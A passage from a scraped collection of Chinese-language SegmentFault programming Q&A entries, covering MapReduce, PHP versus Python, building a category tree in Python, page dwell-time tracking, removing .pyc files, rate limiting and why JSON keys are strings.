仅仅一部研磨机又是否能满足需要？而且现在，我们还需要供应不同种类的辣椒酱，像洋葱辣椒酱、青椒辣椒酱、番茄辣椒酱等等。</p><p>妻子： 当然不能了，我会雇佣更多的工人来切蔬菜。我还需要更多的研磨机，这样我就可以更快地生产辣椒酱了。</p><p>我：没错，所以现在你就不得不分配工作了，你将需要几个人一起切蔬菜。每个人都要处理满满一袋的蔬菜，而每一个人都相当于在执行一个简单的Map操作。每一个人都将不断的从袋子里拿出蔬菜来，并且每次只对一种蔬菜进行处理，也就是将它们切碎，直到袋子空了为止。</p><p>这样，当所有的工人都切完以后，工作台（每个人工作的地方）上就有了洋葱块、番茄块、和蒜蓉等等。</p><p>妻子：但是我怎么会制造出不同种类的番茄酱呢？</p><p>我：现在你会看到MapReduce遗漏的阶段---搅拌阶段。MapReduce将所有输出的蔬菜碎都搅拌在了一起，这些蔬菜碎都是在以key为基础的 map操作下产生的。搅拌将自动完成，你可以假设key是一种原料的名字，就像洋葱一样。 所以全部的洋葱keys都会搅拌在一起，并转移到研磨洋葱的研磨器里。这样，你就能得到洋葱辣椒酱了。同样地，所有的番茄也会被转移到标记着番茄的研磨器里，并制造出番茄辣椒酱。</p><p>披萨终于做好了，她点点头说她已经弄懂什么是MapReduce了。我只希望下次她听到MapReduce时，能更好的理解我到底在做些什么。</p><p><strong>编注：</strong>下面这段话是网上其他人用最简短的语言解释MapReduce：</p><blockquote>We want to count all the books in the library. You count up shelf #1, I count up shelf #2. That's map. The more people we get, the faster it goes.</blockquote><p>我们要数图书馆中的所有书。你数1号书架，我数2号书架。这就是“Map”。我们人越多，数书就更快。</p><blockquote>Now we get together and add our individual counts. That's reduce.</blockquote><p>现在我们到一起，把所有人的统计数加在一起。这就是“Reduce”。</p>\n</div>",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000148955\">\n<p>现在要完成一项海量数据处理的工作。<br/>\n大约有500G的.gz log文件<br/>\n现在要从log中提取一些信息做统计工作~<br/>\n因为文件太大，所以打算用hadoop来做。<br/>\n现在已经安装了hadoop，然后需要自己写mapreduce<br/>\n打算用脚本来写，比如shell，python。<br/>\n可是因为刚入手，所以对mapreduce不是很理解。<br/>\n不知哪位高手能用生动的语言解释一下什么事mapreduce，对于我这个问题来说，mapreduce有分别起到什么作用呢？</p>\n</div>",
      "favourite": "11",
      "glance": "6.8k",
      "tags": [
        "hadoop",
        "shell",
        "python"
      ],
      "time": "2012-12-06",
      "title": "能不能解释一下hadoop中的mapreduce",
      "url": "https://segmentfault.com/q/1010000000148955"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000391412\">\n<p>首先。。。。等。。。。一。。。。会。。。。儿。。。。你当PHP做后端的本事是吃素的不成。。。。</p>\n<p>然后。。。。再。。。。等。。。。一。。。。会。。。。儿。。。。Python效率高。。。。嗯好吧，开发效率高。。。。（撞墙）</p>\n<h3>语言的考虑</h3>\n<p>PHP和Python都有悠久的历史，都有庞大的内置工具库(Python尤其猛)，都有相当完善的文档系统。可以说PHP和Python在很大程度上都表现了“小脚本撬动大需求”的共性。</p>\n<p>所以简单的一个考虑就是：深入谁都差不多。。。完全可以比对着学习的。。。犹豫这个是件没道理的事情。</p>\n<h3>其他技术的考虑</h3>\n<p>但语言虽然很大程度上一致，但语言都不只是语言自己。以Web开发为例：HTML/CSS/JS、SQL、正则、JSON/XML……这些外围知识，PHP和Python都自带，但都不是语言本身所完全覆盖的。</p>\n<p>其实无论招聘什么工程师，都隐含的假设了：除了语言之外，程序员为实现业务目标，也了解必要的外围知识。</p>\n<p>所以千万不要把语言本身孤立的，或者是割裂开来看。</p>\n<h3>技术无关的考虑</h3>\n<p>虽然语言选择无所谓，但是题主这个方法导向的选择恐怕不是好事。</p>\n<p>简单的来说，程序员是为了实现目标而使用语言，而不是为了使用语言而使用语言。“我一定要专学Python，什么都用Python”一类的论调，简而言之就是生搬硬套。</p>\n<p>所以选择语言，不如选择目标。按照自己想承担的开发工作，需要什么学什么，并且一定要快速学习、快速迭代、快速更新。在这个开源运动风行世界的年代，一招鲜吃遍天的事情，一般是荒谬的。因为等闭关学透了，出来一看，江湖早就变了。</p>\n<p>别想着怎样“完美的”开一个好头，也别想着一开始就为自己制定一个“完全”的计划。做梦去吧。不断学习，不断迭代，不断的发现以前期待的事情其实没有价值，不断发现以前忽略的事情其实很有用处，这才是人类的营生之道。变者生，不变者死，不要把自己锁死在某个特定的事物之上。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000391388\">\n<p>前后端都可以做？？？Python做前端？<br>\n既然喜欢Python就用Python呗，天朝内用Python的企业又不是没有，比如豆瓣。<br>\n最后给你看看国内那些公司在用Python，也许你就不会这么纠结了：<a href=\"http://www.zhihu.com/question/19555512\" rel=\"nofollow\">http://www.zhihu.com/question/19555512</a></br></br></p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000396408\">\n<p>很多语言初学者都会问\"我该学什么语言好，什么语言好找工作?\"。我觉得这个问题本身就是有误区，一门编程语言的产生是因为它能够比其他语言更方便的解决某个或某类型的问题。所以我觉得你首先应该考虑的是自己喜欢做什么？喜欢从事什么样的工作？然后选择学习某门语言，带着问题学习总是比为了学习语言而学习更有效率，而不是盲目的选择某门语言。例如，如果你对前端很感兴趣，那么你需要深入学习的可能是JavaScript，而不是深挖C。</p>\n</div>",
      "attention": "9",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000391380\">\n<p>大神门， 我正在纠结深入php 还是python， 都会一点点， 个人比较喜欢python，前后端都可以做，而且效率搞，语法吸引人。  但是php好像比较好找工作，百度，新浪，XXX 都是PHP比较多，  肿么办呢？ 救救我吧，谢谢了</p>\n</div>",
      "favourite": "9",
      "glance": "31k",
      "tags": [
        "python",
        "php",
        "后端",
        "linux"
      ],
      "time": "2014-01-19",
      "title": "深入学习PHP还是Python",
      "url": "https://segmentfault.com/q/1010000000391380"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000416033\">\n<p>Stackoverflow上的那个答案，要t中的父元素出现在子元素之前，如果不能保证，可以用下面的方式：</p>\n<pre><code>from itertools import groupby\nfrom operator import itemgetter as get\nfrom pprint import pprint\n\n# group by fid\ntmp = dict([(k, list(rows)) for k, rows in groupby(sorted(t, key=get(1)), get(1))])\n\ndef map_fun(row):\n  item = dict(zip(('id', 'fid', 'title'), row))\n  if row[0] in tmp:\n    item['son'] = find_children(row[0])\n  return item;\n\ndef find_children(parent):\n    return map(map_fun, tmp[parent])\n\npprint(find_children(-1))\n</code></pre>\n<p>关于pythonic，可以试试这个<br><code>&gt;&gt;&gt; import this</code></br></p>\n<p>PS:我不是大神啊。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000418312\">\n<p>entries[id] = entry = {'id': id, 'fid': fid, 'title': title}<br>\n会造成内存暴涨的</br></p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000415991\">\n<p>我这里先问个问题，查询的元组pid是递增的吗？<br>\n也就是说<code>parent = entries[fid]</code>一定是能取到值的呗？</br></p>\n<hr>\n<p>StackOverFlow的大神答案已经很效率了吧。。虽然是错的...如果你的数据是乱序的话，你贴的代码输出的结果就不正确了。<br>\n虽然不知道你说的<code>pythonic</code>是啥...如果以看不懂为目的的话，我写了一个...<br>\n无论如何，不建议使用这种代码习惯，清晰可读是所有编程的通性，如果为了玩的话，你可以去codeforece上看看各路大神解题的答案。</br></br></p>\n<hr>\n<pre><code>e, l = {d[0]:{'id': d[0], 'fid': d[1], 'title': d[2]} for d in t}, []\nfor i in e: l.append(e[i]) if e[i]['fid'] == -1 else e[e[i]['fid']].setdefault('son', []).append(e[i])\nprint l\n</code></pre>\n<p>第一行先格式化数据并存储在e中<br>\n第二行对e进行遍历，如果e['fid'] == -1  则添加到l数组中。 否则找到对应的e[e[fid]]添加其子节点。</br></p>\n<p>因为l.append(e[i])是地址拷贝，所以e中的数据更改直接影响l的数据(因为都是指向同一个地址的嘛~) 具体细节可以参考我在另外一个问题里面的答案 <a href=\"http://segmentfault.com/q/1010000000397465#a-1020000000397966\" rel=\"nofollow\">http://segmentfault.com/q/1010000000397465#a-1020000000397966</a></p>\n<hr>\n<p>以下是上面那个代码的正常版本：</p>\n<pre><code>l = []\nentities= {d[0]:{'id': d[0], 'fid': d[1], 'title': d[2]} for d in t}\nfor e_id in entities:\n  entitiy = entities[e_id]\n  fid = entitiy['fid']\n  if fid == -1:\n    l.append(entitiy)\n  else:\n    entities[fid].setdefault('son',[]).append(entitiy)\nprint l\n</code></pre>\n</hr></hr></hr></div>",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000415526\">\n<p>有一个数据表</p>\n<pre><code>id   fid        title\n1    -1          python\n2    -1          ruby\n3    -1          php\n4    -1          lisp\n5     1          flask\n6     1          django\n7     1          webpy\n8     2          rails\n9     3          zend\n10    6          dblog\n</code></pre>\n<p>这是一个栏目表,title 是栏目名称, id 是栏目 id, fid 是栏目的父id.构建一个多级栏目分类</p>\n<p>通过 python 查询处理,会得到下面的一个元祖,</p>\n<pre><code>    t = (\n    (1, -1, 'python'),\n    (2, -1, 'ruby'),\n    (3, -1, 'php'),\n    (4, -1, 'lisp'),\n    (5,  1, 'flask'),\n    (6,  1, 'django'),\n    (7,  1, 'webpy'),\n    (8,  2, 'rails'),\n    (9,  3, 'zend'),\n    (10, 6, 'dblog')\n)\n</code></pre>\n<p>希望通过 python 处理,转换成下面的 list 字典树</p>\n<pre><code>    l = [\n    {\n        'id': 1,\n        'fid': -1,\n        'title': 'python',\n        'son': [\n            {\n                'id': 5,\n                'fid': 1,\n                'title': 'flask',\n            },\n            {\n                'id': 6,\n                'fid': 1,\n                'title': 'django',\n                'son': [\n                    {\n                        'id': 10,\n                        'fid': 6,\n                        'title': 'dblog',\n                    },\n                ]\n            },\n            {\n                'id': 7,\n                'fid': 1,\n                'title': 'webpy',\n            },\n        ]\n    },\n    {\n        'id': 2,\n        'fid': -1,\n        'title': 'ruby',\n        'son': [\n            {\n                'id': 8,\n                'fid': 2,\n                'title': 'rails',\n            },\n        ]\n    },\n    {\n        'id': 3,\n        'fid': -1,\n        'title': 'php',\n        'son': [\n            {\n                'id': 9,\n                'fid': 3,\n                'title': 'zend',\n            },\n        ]\n    },\n    {\n        'id': 4,\n        'fid': -1,\n        'title': 'lisp',\n    }\n]\n</code></pre>\n<p>也就是类似网站的目录, 父栏目包含子栏目.<br>\n自己写了好几个,感觉效率不够好, 求大神更 pythonic 的方法</br></p>\n<p>在 stackoverflow 有人回答 大概如下：</p>\n<pre><code>from pprint import pprint\n\nl = []\nentries = {}\n\nfor id, fid, title in t:\n     entries[id] = entry = {'id': id, 'fid': fid, 'title': title}\n     if fid == -1:\n          l.append(entry)\n     else:\n          parent = entries[fid]\n          parent.setdefault('son', []).append(entry)\n\npprint(l)\n</code></pre>\n</div>",
      "favourite": "3",
      "glance": "4k",
      "tags": [
        "python",
        "数据结构",
        "算法"
      ],
      "time": "2014-02-21",
      "title": "python 数据结构转换,将线性元祖转换成字典树",
      "url": "https://segmentfault.com/q/1010000000415526"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000505037\">\n<p>一般的方法都是记录每次请求的日志（包括uv标示，当前url，来源url，浏览器信息，ip，访问时间等），这些初始日志就可以分析出某个用户在某个url上停留多久（下一个页面请求时间-当页面时间），当然更精细的就要考虑tab页或新窗口问题。如果是最后一个页面访问，这种方式就很难获知停留时间了。<br>\najax定时提交当然可以解决，只是为了一个停留时间数据（这数据相对没有那么重要，误差较大），每个页面做一个定时ajax感觉还是小题大做了。当然如果你的ajax还提交其他信息（比如用户在页面上滚动条位置），那倒是可以尝试下的。</br></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000501100\">\n<p>问题简单化：当用户每次发起一个http请求的时候记录url和时间戳，然后你后台计算不同类型的（即相同url，参数不一样）间隔时间，最后能够得出用户在不同类型页面的停留时间。<br>\n现在有些app应用就是只有一个页面，但你也可以通过url中的hash来区分不同的请求类型并加以计算，这样你就能够统计出用户在某个页面的停留时间。<br>\n如果是全部采用ajax方式加载的花只能对不同的请求地址进行计算了。<br>\n前提是你要使用一个并发量支持度很高的缓存系统，并且该缓存系统能够为你进行一些简单的数学计算，有幸的是市场上已经有了，你自己选个最能配合你出色完成任务的产品吧。</br></br></br></p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000501083\">\n<p>看你要精确到什么颗粒度了</p>\n<p>方案1：websocket<br>\n前端开个长连接，后台统计长连接时间。</br></p>\n<p>方案2：ajax轮询<br>\n隔几秒发一个查询，后台记录第一与最后一个查询间隔时间</br></p>\n</div>",
      "attention": "3",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000500929\">\n<p>首先，在服务器端进行统计，我个人感觉应该不可以吧，因为http协议是无状态的，浏览器与服务器之间并不会建立持久连接。这意味着当一个客户端向服务器端发出请求，然后Web服务器返回响应，连接就被关闭了。<br>\n所以就无法在服务器端对用户访问某个页面的时长进行统计了，只能统计出某个用户访问某个页面的具体时间吧？</br></p>\n<p>请问，该如何实现这个需求呢？<br>\n注：在不适用第三方流量统计器的情况下</br></p>\n</div>",
      "favourite": "11",
      "glance": "6.5k",
      "tags": [
        "php",
        "python",
        "ruby"
      ],
      "time": "2014-05-10",
      "title": "如何统计用户在某个页面的停留时长呢？",
      "url": "https://segmentfault.com/q/1010000000500929"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000002181420\">\n<p><code>rm **/*.pyc</code></p>\n<p>补充说明：在bash下要在<code>~/.bashrc</code>中添加<code>shopt -s globstar</code></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000002226401\">\n<p>在打包时忽略 .pyc 文件或许是个更方便的办法。<br><code>tar</code>和<code>zip</code>都可以加上 <code>--exclude=*.pyc</code> 参数来排除 pyc 文件</br></p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000002218646\">\n<p>如果你使用的是linux或者mac，在终端执行这样的操作</p>\n<pre><code>find /tmp -name \"*.pyc\" | xargs rm -rf\n</code></pre>\n<p>如果提示<strong>Permission denied</strong>，则使用</p>\n<pre><code>sudo find /tmp -name \"*.pyc\" | xargs rm -rf\n</code></pre>\n<p>将上面的<strong>/tmp</strong>替换成工程目录即可。这个命令会遍历删除工程目录（含子目录）下的pyc文件。</p>\n</div>",
      "attention": "14",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002179781\">\n<p>对项目进行打包，所有 .pyc 文件需要移除。<br>\n由于有的 .pyc 文件在子目录里，所有不知道该怎么遍历移除，求解？</br></p>\n</div>",
      "favourite": "5",
      "glance": "5k",
      "tags": [
        "python",
        "bash",
        "shell"
      ],
      "time": "2014-11-20",
      "title": "怎样遍历移除项目中的所有 .pyc 文件",
      "url": "https://segmentfault.com/q/1010000002179781"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000002942744\">\n<p>为每个secret维护一个长度为100的队列<br>\n当队列长度为100的时候，取出队列头<br>\n判断时间是否超过1分钟，则accept<br>\n如果不足1分钟则deny<br>\n然后shift和push队列即可</br></br></br></br></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000002995692\">\n<p>这个呢？<br>\nRedis 与网络流量整形<br><a href=\"http://blog.jobbole.com/88064/\" rel=\"nofollow\">http://blog.jobbole.com/88064/</a></br></br></p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000002950771\">\n<html><body><p>nginx的limit_req_zone就符合你想要的这种需求,它是使用令牌桶算法的.具体你可以看一下.<img data-src=\"/img/bVmyfo\"/></p></body></html>\n</div>",
      "attention": "42",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002938194\">\n<h2>如何限制接口调用者对接口的调用频率？</h2>\n<h3>问题:对某个对外暴露的接口加一个限制:调用者一分钟之内调用次数不能超过100次,如果超过100次就直接返回给调用者失败的信息。</h3>\n<ul>\n<li>给调用者一个SECRET，每次调用者需要调用接口的时候,都需要把这个SECRET带过来(为了安全需要对key进行一系列加密的措施)</li>\n<li>一个SECRET就代表一个调用者,把相应的SECRET的调用次数放入缓存中(必须确保次数增加的原子性)，并且把SECRET当做缓存的SECRET(这里如果区分方法的话,可以把方法和KEY做一次加密）。</li>\n</ul>\n<p>这里主要的难点就是,如何判断调用者1分钟之内调用次数是否超过100？也就是很难确实这个1分钟的开始时间。</p>\n<p>我现在的想法是:分别把当前秒调用的次数存入缓存。比如说,当前调用者调用次数为3,那么我就往缓存中加入KEY=SECRET_1,VALUE=3;然后调用者在第二秒调用的次数为4，那么就往缓存中加入KEY=SECRET_2,VALUE=3;如此循环,当循环到61秒的时候替换KEY=SECRET_1中得VAALUE,每次调用的时候计算SECRET_1~SECRET_60的值来判断调用次数,是否超过100次。(这里具体一秒钟调用几次,需要通过时间戳来算出是第几秒。这里以60秒为时间周期,并且以秒为一个时间单位,当然如果要求不是很准确的话,时间单位可以调大一点)</p>\n<p><em>问题</em> 请问有没有别的更好方法或者想法可以实现这个调用频率的限制？</p>\n</div>",
      "favourite": "27",
      "glance": "6.1k",
      "tags": [
        "接口设计",
        "java",
        "php",
        "python",
        "程序设计"
      ],
      "time": "2015-06-27",
      "title": "怎么保证对外暴露接口的安全性(调用频率限制)",
      "url": "https://segmentfault.com/q/1010000002938194"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "5",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000003997125\">\n<pre><code>temp\nOut[53]: -0.7037246201969727\n\ntype(temp)\nOut[54]: float\n\ntype(-0.7037246201969727)\nOut[55]: float\n\ntemp**(1.0/3)\nOut[56]: (0.4447380144139145+0.7703088370221993j)\n\n-0.7037246201969727**(1.0/3)\nOut[57]: -0.8894760288278287</code></pre>\n<p>1、如图，为什么temp<strong>(1.0/3)求出来的结果是复数，而-0.7037246201969727</strong>(1.0/3)求出来的结果没有问题。该怎么解决<br>2、如果用算术库的话该怎么写呢，用math.pow()总是报错，求帮忙解决</br></p>\n</div>",
      "favourite": "1",
      "glance": "994",
      "tags": [
        "python"
      ],
      "time": "2015-11-15",
      "title": "python 开立方问题",
      "url": "https://segmentfault.com/q/1010000003997125"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000004507852\">\n<p>试试这个RAP, 简单易用。部署后在线浏览，包含权限控制与接口文档的版本控制。<br><a href=\"http://rap.taobao.org/org/index.do\"></a><a href=\"http://rap.taobao.org/org/index.do\">http://rap.taobao.org/org/index.do</a></br></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000004504991\">\n<p>有个开源的接口管理工具   <a href=\"http://git.oschina.net/leunpha/apiManager\">http://git.oschina.net/leunpha/apiManager</a>   还不错  可以试试</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000004507740\">\n<p>最好的API文档管理工具 <a href=\"http://swagger.io/\">http://swagger.io/</a> 不多说了，官方文档很全，自个研究吧</p>\n</div>",
      "attention": "24",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000004504951\">\n<blockquote><p>开发restful接口，需要和IOS,Android对接。<br>刚开始是Git直接是上文档，现在接口越来越多，难管理、难验证、难查询<br>想找达到以下目的的工具</br></br></p></blockquote>\n<p>1、管理接口地址、请求方法、携带参数，接口版本，说明。<br>2、模拟请求类似POSTMAN<br>3、批量完成一组（多个规定的接口）请求<br>4、能扩展，例如将用户整合进来。</br></br></br></p>\n<p>如果有那用现有轮子，更方便。<br>如果没有那就只能造了一个了（其实还是不喜欢造！）</br></p>\n</div>",
      "favourite": "15",
      "glance": "1.3k",
      "tags": [
        "php",
        "golang",
        "node.js",
        "python",
        "java"
      ],
      "time": "2-28",
      "title": "有什么好的接口管理工具吗？",
      "url": "https://segmentfault.com/q/1010000004504951"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "2",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000005039415\">\n<p>一个人写的确很累，尤其是在前端方面，有兴趣的可以看看，虽然有的代码很 low</p>\n<p>论坛:<a href=\"https://github.com/honmaple/maple-bbs\">github.com/honmaple/maple-bbs</a><br>博客:<a href=\"https://github.com/honmaple/maple-blog\">github.com/honmaple/maple-blog</a></br></p>\n</div>",
      "favourite": "1",
      "glance": "512",
      "tags": [
        "python",
        "flask"
      ],
      "time": "4-30",
      "title": "基于 flask 写了个博客和论坛",
      "url": "https://segmentfault.com/q/1010000005039415"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000005682683\">\n<p>你好，針對你的問題，我覺得你自己貼的那篇 stack overflow 的文章已經說得很清楚了。</p>\n<p>補充一下我對於 json 中 object key 的看法:</p>\n<p>首先你可以看到 <a href=\"http://www.json.org/\">json.org</a> 中對於 json <strong>object</strong> 和 <strong>string</strong> 的定義:</p>\n<blockquote>\n<p><strong>object</strong>: An object is an unordered set of name/value pairs. An object begins with { (left brace) and ends with } (right brace). Each name is followed by : (colon) and the name/value pairs are separated by , (comma).</p>\n<p><strong>string</strong>: A string is a sequence of zero or more Unicode characters, <code>wrapped in double quotes</code>, using backslash escapes. A character is represented as a single character string. A string is very much like a C or Java string.</p>\n</blockquote>\n<p>同時我們可以在 <a href=\"http://tools.ietf.org/html/rfc4627\">The application/json Media Type for JavaScript Object Notation (JSON)</a> 中看到以下的敘述:</p>\n<blockquote><p>An object is an unordered collection of zero or more name/value pairs, where <code>a name is a string</code> and a value is a string, number, boolean, null, object, or array.</p></blockquote>\n<p>我們可以清楚了解到，json 用來表述 object 用 string (雙引號夾住的字符集) 當作 key 的唯一選擇。</p>\n<p>這說明了在 json 的定義或是 spec 中是明顯規範了 key 的型態跟表達方式，這可能出於<code>某些設計哲學上的考量</code>，也可能只是<code>某些實作上的選擇</code>，當然我們可以去追究當中的意涵，但是:</p>\n<blockquote><p>對於一般的使用者而言，能夠認識到這一點以避免設計上的問題應該是更為重要的。</p></blockquote>\n<p>就像是我們未必會去深究 Python 為何不使用 <code>else if</code> 而要使用 <code>elif</code>，為什麼我們複製 tuple 卻拿不到副本，而是拿到同一個對象等等。</p>\n<hr>\n<p>當然這可能不能滿足我們的求知欲，所以我試圖提出一些觀點(還有真正大師的觀點)</p>\n<blockquote><p>P.S. 我在這裡並不打算說服你，因為我自認為我完全不是個 json 專家(笑)。</p></blockquote>\n<p>如果你嘗試使用過 javascript 去建立一個 object，你會發現，以下的敘述語句是行得通的:</p>\n<pre><code>var obj = {hello:1, world:2}</code></pre>\n<p>這相等於:</p>\n<pre><code>var obj = {\"hello\":1, \"world\":2}</code></pre>\n<p>可見在 js 中，object 的 key 有沒有雙引號在 evaluate 的時候都是一樣的。 甚至目前的 js object 用整數或是 js 關鍵字也能當作 key ...</p>\n<p>但在 json 中，key 不但要是 string，還必須以雙引號夾住，所以很多人的疑問反而是，為什麼 js 中可以不用雙引號，但是 json 卻要? 我覺得這是一個重點，當雙引號的規則被使用的時候，不是 string 的東西也會變成 string 了(因為非得用雙引號不可)，那所以為什麼要用雙引號咧?</p>\n<p>關於這一點，你可以參考一下 Douglas Crockford (json 標準創造者) 在某個演講上面的一段說詞:</p>\n<blockquote>\n<p>That was when we discovered the unquoted name problem. It turns out ECMA Script 3 has a whack reserved word policy. Reserved words must be quoted in the key position, which is really a nuisance. When I got around to formulizing this into a standard, I didn't want to have to put all of the reserved words in the standard, because it would look really stupid.</p>\n<p>At the time, I was trying to convince people: yeah, you can write applications in JavaScript, it's actually going to work and it's a good language. I didn't want to say, then, at the same time: and look at this really stupid thing they did! So I decided, instead, let's just quote the keys. That way, we don't have to tell anybody about how whack it is. That's why, to this day, keys are quoted in JSON.</p>\n</blockquote>\n<p>總而言之，大意是說，為了避免 <code>json 因為要避免使用它的語言發生問題</code> 所導致的過度複雜的標準(比如說考慮所有關於那個語言的關鍵字在作為 key 的情況)，那乾脆用個簡單的法則來解決所有可能的意外，那就是加上雙引號拉。</p>\n<p>以上不知道有沒有讓你有一些想法呢? 其實很多人覺得只能使用 string key 是為了不同語言使用 json 上面的穩定性我覺得也很有道理，我覺得能找個理由說服自己就很不錯了，畢竟怎麼理解他這樣設計可以有千千萬萬種解讀，至於真正的原因，也就只有他的創造者或標準的維護者知道了。</p>\n<hr>\n<p><strong>總之，簡單而明確的規則不是很不錯嗎!</strong></p>\n<p>參考資料:<br><a href=\"http://stackoverflow.com/questions/2067974/in-json-why-is-each-name-quoted\">in JSON, Why is each name quoted?</a><br><a href=\"http://stackoverflow.com/questions/4201441/is-there-any-practical-reason-to-use-quoted-strings-for-json-keys\">Is there any practical reason to use quoted strings for JSON keys?</a><br><a href=\"http://www.w3schools.com/js/js_json.asp\">Converting a JSON Text to a JavaScript Object</a><br><a href=\"http://adripofjavascript.com/blog/drips/object-equality-in-javascript.html\">Object Equality in JavaScript</a></br></br></br></br></p>\n<hr>\n<p>(以下是題外話)</p>\n<p>對於你一開始的這個敘述:</p>\n<blockquote><p>在 Python 中，字典的 key 可以是任意 immutable 对象</p></blockquote>\n<p>稍微有點不精確，分享我自己的看法。</p>\n<p>關於甚麼樣的對象可以作為字典的鍵，我們應該這樣說:</p>\n<blockquote><p>在 Python 中，字典的 key 必須要是 hashable 的</p></blockquote>\n<p>有人可能會覺得很奇怪，immutable 的對象不應該都是 hashable 的嗎?</p>\n<p>其實並不盡然，我們看一個例子:</p>\n<pre><code>&gt;&gt;&gt; a = ([1, 2, 3], 4, 5)\n&gt;&gt;&gt; hash(a)\nTraceback (most recent call last):\n  File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;\nTypeError: unhashable type: 'list'\n&gt;&gt;&gt; dic = {}\n&gt;&gt;&gt; dic[a] = 0\nTraceback (most recent call last):\n  File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;\nTypeError: unhashable type: 'list'</code></pre>\n<p><code>a</code> 是一個 tuple，我想我們應該都同意他是 immutable 的對象，可是這個 tuple 含有一個 mutable 的 list 元素，導致他自己成為一個非 hashable 對象，這就不能當作字典 <code>dic</code> 的鍵了。</p>\n<p>這是非常容易被忽略的一點:</p>\n<blockquote><p>tuple 只有在他的元素都是 hashable 的情況下，才會是 hashable 的</p></blockquote>\n<p>所以其實有些 tuple 可以當作字典的鍵:</p>\n<pre><code>&gt;&gt;&gt; b = (1,2,3)\n&gt;&gt;&gt; dic[b] = 0</code></pre>\n<p>那我們到底要如何判斷一個對象是否為 hashable 的(也就是他可以作為字典的鍵)呢? (第三點針對 Python3)</p>\n<ol>\n<li><p>基本的 immutable builtin type 都是 hashable 的，除非他們包含了 mutable 的元素(見規則2)，ex: str, bytes, ...</p></li>\n<li><p>tuple 只有在所有元素都是 hashable 的對象時，他才是 hashable 的</p></li>\n<li><p>自定義的類基本上都是 hashable 的，因為他們的 hash 值是由他們的 id 值推導出來的。但假如我們有實作它的 <code>__eq__</code> 方法，因為要維持 hash 跟 equality 的一致性，所以如果我們沒有一併重新實作 <code>__hash__</code>，則該類也會變成 unhashable 的。</p></li>\n</ol>\n<p>以上幾點可參考:</p>\n<ol>\n<li><p><a href=\"http://stackoverflow.com/questions/1608842/types-that-define-eq-are-unhashable-in-python-3-x\">Types that define <code>__eq__</code> are unhashable in Python 3.x?</a></p></li>\n<li><p><a href=\"https://docs.python.org/3/glossary.html#term-hashable\">Python doc - Glossary</a></p></li>\n</ol>\n</hr></hr></hr></div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000005682402\">\n<p>json是一个dictionary结构，绝大部分语言dictionary中的key都是字符串。这就是为什么json的key必须是字符串的原因。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000005684722\">\n<p>首先JSON是Javascript的子集,而在Javascript中只有字符串、整型等5个数据类型,而后在其他编程语言中被使用,其他的语言的实现都是为了兼容JSON,比如Python标准库的json模块。详情可以查看<a href=\"http://www.json.org/js.html\">json</a> <br>至于JSON中为什么采用字符串作为键主要在于,首先需要是1个不可变的对象,因此只能是字符串、整型、浮点型这样的数据类型了,而在计算机中1个整型需要占用4个字节的内存,而字符只占用1个字节。  <br>另外,使用JSON主要是为了传输数据,这个网络传输的过程中会丢失精度也是需要考虑的,而整型和浮点数都会出现精度的丢失。  <br>另外使用字符串的形式还可以使用压缩算法进行压缩,进而节省带宽。    <br>因此字符串是最佳的选择。</br></br></br></br></p>\n</div>",
      "attention": "11",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000005682217\">\n<p>在python中，字典的key可以是任意immutable对象，但json的key却只能是string。</p>\n<p>在stackoverflow上搜到的相关问题，<a href=\"http://stackoverflow.com/questions/9304528/why-json-allows-only-string-to-be-a-key\">Why JSON allows only string to be a key?</a></p>\n<p>最佳答案是说json是为了数据在不同程序之间相互传递，所以string能保证不同的程序语言都能支持这种数据结构。但我还是不明白为什么int、float之类的不行。</p>\n<pre><code class=\"python\">json.dumps({1:1,2:2})\n'{\"1\": 1, \"2\": 2}</code></pre>\n</div>",
      "favourite": "2",
      "glance": "767",
      "tags": [
        "javascript",
        "json",
        "python"
      ],
      "time": "6-9",
      "title": "为什么json的key只能是string？",
      "url": "https://segmentfault.com/q/1010000005682217"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
